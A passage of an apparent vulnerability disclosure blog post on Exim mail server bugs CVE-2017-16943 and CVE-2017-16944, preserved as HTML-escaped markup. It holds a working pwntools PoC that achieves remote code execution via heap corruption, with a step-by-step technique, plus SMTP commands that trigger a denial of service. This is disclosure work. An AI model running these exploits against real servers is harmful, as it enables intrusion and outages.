&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;command&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ol&gt;
  &lt;li&gt;Running out of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt;
 In order to achieve code execution, we need to make the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; get the first store of a block. That is, running out of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; and making &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; allocate a new block. Therefore, we send a long message &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;a&apos;*0x1250+&apos;\x7f&apos;&lt;/code&gt; with an unprintable character to cut &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt;, making &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yield_length&lt;/code&gt; less than 0x100.
 &lt;img src=&quot;/assets/img/blog/20171211/2.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;Starts BDAT data transfer
 After that, we send BDAT command to start data transfer. At the beginning, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; are allocated by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt;. 
 &lt;img src=&quot;/assets/img/blog/20171211/3.png&quot; alt=&quot;&quot; /&gt;
 The function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dkim_exim_verify_init&lt;/code&gt; is called sequentially and it also calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt;. Notice that this function uses &lt;strong&gt;ANOTHER &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_pool&lt;/code&gt;&lt;/strong&gt;, so it allocates from heap without changing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; which &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; also points to.
 &lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1734&quot;&gt;receive.c: 1734 receive_msg&lt;/a&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smtp_input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smtp_batched_input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dkim_disable_verify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;dkim_exim_verify_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chunking_state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CHUNKING_OFFERED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_getc&lt;/code&gt; inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bdat_getc&lt;/code&gt;
 Then, we send a BDAT command without SIZE. Exim complains about the incorrect command and cuts the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;string_printing&lt;/code&gt;. 
 &lt;img src=&quot;/assets/img/blog/20171211/4.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;Keep sending msg until extension and bug triggered
 In this way, while we keep sending huge messages, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; gets freed after the extension. In the malloc.c of glibc (so called ptmalloc2), system manages a linked list of freed memory chunks, which is called unsorted bin. Freed chunks are put into unsorted bin if it is not the last chunk on the heap. In step 2, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dkim_exim_verify_init&lt;/code&gt; allocated chunks after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt;. Therefore, this chunk is put into unsorted bin and the pointers of linked list are stored into the first 16 bytes of chunk (on x86-64). The location written is exactly &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block-&amp;gt;next&lt;/code&gt;, and therefore &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block-&amp;gt;next&lt;/code&gt; is overwritten to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unsorted bin&lt;/code&gt; inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_arena&lt;/code&gt; of libc (linked list pointer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd&lt;/code&gt; points back to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unsorted bin&lt;/code&gt; if no other freed chunk exists). 
 &lt;img src=&quot;/assets/img/blog/20171211/5.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;Keep sending msg for the next extension
 When the next extension occurs, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; tries to cut from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_arena&lt;/code&gt;, which makes attackers able to overwrite all global variables below main_arena.&lt;/li&gt;
  &lt;li&gt;Overwrite global variables in libc&lt;/li&gt;
  &lt;li&gt;Finish sending message and trigger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;free()&lt;/code&gt;
 In the PoC, we simply modified &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__free_hook&lt;/code&gt; and ended the line. Exim calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_reset&lt;/code&gt; to reset the buffer and calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__free_hook&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;free()&lt;/code&gt;. At this stage, we successfully controlled instruction pointer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$rip&lt;/code&gt;.
 However, this is not enough for an RCE because the arguments are uncontrollable. As a result, we improved this PoC to modify both &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__free_hook&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_IO_2_1_stdout_&lt;/code&gt;. We forged the vtable of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdout&lt;/code&gt; and set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__free_hook&lt;/code&gt; to any call of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fflush(stdout)&lt;/code&gt; inside exim. When the program calls fflush, it sets the first argument to stdout and jumps to a function pointer on the vtable of stdout. Hence, we can control both &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$rip&lt;/code&gt; and the content of first argument. 
 We consulted past CVE exploits and decided to call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;expand_string&lt;/code&gt;, which executes command with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execv&lt;/code&gt; if we set the first argument to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;${run{cmd}}&lt;/code&gt;, and finally we got our RCE. 
 &lt;img src=&quot;/assets/img/blog/20171211/6.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;exploit-for-default-configured-exim&quot;&gt;Exploit for default configured exim&lt;/h4&gt;
&lt;p&gt;When dkim is disabled, the PoC above fails because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; is the last chunk on heap. This makes the system merge it into a big chunk called &lt;strong&gt;top chunk&lt;/strong&gt; rather than unsorted bin.
The illustrations below describe the difference of heap layout:
&lt;img src=&quot;/assets/img/blog/20171211/8.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/img/blog/20171211/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To avoid this, we need to make exim allocate and free some memories before we actually start our exploitation. Therefore, we add some steps between step 1 and step 2.&lt;/p&gt;

&lt;p&gt;After running out of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt;:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Use DATA command to send lots of data
 Send huge data, make the chunk big and extend many times. After several extension, it calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; to retrieve a bigger store and then releases the old one. This repeats many times if the data is long enough. Therefore, we have a big chunk in unsorted bin.&lt;/li&gt;
  &lt;li&gt;End DATA transfer and start a new email
 Restart to send an email with BDAT command after the heap chunk is prepared.&lt;/li&gt;
  &lt;li&gt;Adjust &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yield_length&lt;/code&gt; again
 Send invalid command with an unprintable charater again to cut the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Finally the heap layout is like:
&lt;img src=&quot;/assets/img/blog/20171211/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And now we can go back to the step 2 at the beginning and create the same situation. When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; is freed, it goes back to unsorted bin and we are able to overwrite libc global variables again.
The following is the PoC for default configured exim:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# CVE-2017-16943 PoC by meh at DEVCORE
# pip install pwntools
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;localhost&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EHLO test&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;250 HELP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MAIL FROM:&amp;lt;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;RCPT TO:&amp;lt;meh@some.domain&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1280&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;command&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;DATA&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;itself&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;b&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MAIL FROM:&amp;lt;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;RCPT TO:&amp;lt;meh@some.domain&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3480&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;command&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;BDAT 1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;:BDAT &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1e00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A demo of our exploit is as below.
&lt;img src=&quot;/assets/img/blog/20171211/7-demo.png&quot; alt=&quot;&quot; /&gt;
Note that we have not found a way to leak memory address and therefore we use heap spray instead. It requires another information leakage vulnerability to overcome the PIE mitigation on x86-64.&lt;/p&gt;

&lt;h1 id=&quot;incorrect-bdat-data-handling-leads-to-dos&quot;&gt;Incorrect BDAT data handling leads to DoS&lt;/h1&gt;

&lt;h3 id=&quot;vulnerability-analysis-1&quot;&gt;Vulnerability Analysis&lt;/h3&gt;
&lt;p&gt;When receiving data with BDAT command, SMTP server should not consider a single dot &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;‚Äò.‚Äô&lt;/code&gt; in a line to be the end of message. However, we found exim does in receive_msg when parsing header. Like the following output:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;220 devco.re ESMTP Exim 4.90devstart_213-7c6ec81-XX Mon, 27 Nov 2017 16:58:20 +0800
EHLO test
250-devco.re Hello root at test
250-SIZE 52428800
250-8BITMIME
250-PIPELINING
250-AUTH PLAIN LOGIN CRAM-MD5
250-CHUNKING
250-STARTTLS
250-PRDR
250 HELP
MAIL FROM:&amp;lt;meh@some.domain&amp;gt;
250 OK
RCPT TO:&amp;lt;meh@some.domain&amp;gt;
250 Accepted
BDAT 10
.
250- 10 byte chunk, total 0
250 OK id=1eJFGW-000CB0-1R
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;As we mentioned before, exim uses function pointers to switch input source. This bug makes exim go into an incorrect state because the function pointer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt; is not reset. If the next command is also a BDAT, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lwr_receive_getc&lt;/code&gt; become the same and an infinite loop occurs inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bdat_getc&lt;/code&gt;. Program crashes due to stack exhaustion.
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L546&quot;&gt;smtp_in.c: 546 bdat_getc&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  if (chunking_data_left &amp;gt; 0)
    return lwr_receive_getc(chunking_data_left--);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This is not enough to pose a threat because exim runs a fork server. After a further analysis, we made exim go into an infinite loop without crashing, using the following commands.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# CVE-2017-16944 PoC by meh at DEVCORE

EHLO localhost
MAIL FROM:&amp;lt;meh@some.domain&amp;gt;
RCPT TO:&amp;lt;meh@some.domain&amp;gt;
BDAT 100
.
MAIL FROM:&amp;lt;meh@some.domain&amp;gt;
RCPT TO:&amp;lt;meh@some.domain&amp;gt;
BDAT 0 LAST
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This makes attackers able to launch a resource based DoS attack and then force the whole server down.&lt;/p&gt;

&lt;h2 id=&quot;fix&quot;&gt;Fix&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Turn off Chunking option in config file:
